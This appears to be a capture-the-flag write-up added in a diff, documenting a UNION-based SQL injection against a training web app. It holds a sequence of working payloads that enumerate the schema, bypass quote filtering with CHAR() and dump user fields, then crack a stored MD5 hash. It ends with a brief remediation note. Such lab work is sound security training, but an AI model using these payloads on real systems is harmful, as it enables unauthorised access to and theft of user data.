@@ -1,0 +1,31 @@
+1 UNION SELECT 1, database() -> return "Member_Sql_Injection"
+
+1 UNION SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
+    - Returned the list of tables name and we get see the table named "users"
+
+Details : CHAR(117,115,101,114,115) correspond to users, we cannot user ' or " caracters.
+
+1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = CHAR(117,115,101,114,115)
+    - Returned "user_id", "first_name", "last_name", "town", "country", "planet", "commentaire", "countersign",
+
+1 UNION SELECT user_id, first_name FROM users
+    - Returned a list of user_id and name which contain an user_id 5 with name Flag
+
+1 UNION SELECT user_id, last_name, first_name FROM users where user_id = CHAR(53)
+    - Returned lastname -> "GetThe" firstname = "flag"
+
+1 UNION SELECT user_id, town FROM users where user_id = CHAR(53)
+    - Returned town -> 42
+1 UNION SELECT user_id, country FROM users where user_id = CHAR(53)
+    - Returned country -> 42
+1 UNION SELECT user_id, planet FROM users where user_id = CHAR(53)
+    - Returned planet -> 42
+1 UNION SELECT user_id, commentaire FROM users where user_id = CHAR(53)
+    - Returned commentaire "Decrypt this password -> then lower all the char. Sh256 on it and it's good !" which give details
+1 UNION SELECT user_id, countersign FROM users where user_id = CHAR(53)
+    - "5ff9d0165b4f92b14994e5c685cdce28" which is an md5, decrypt it and get "FortyTwo"
+    - Lower "FortyTwo" to fortytwo and hash it with sha256 and get the flag "10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5"
+
+Resolution :
+    - The server need the sanitize form fields before use them into a sql queri or user and ORM.
+
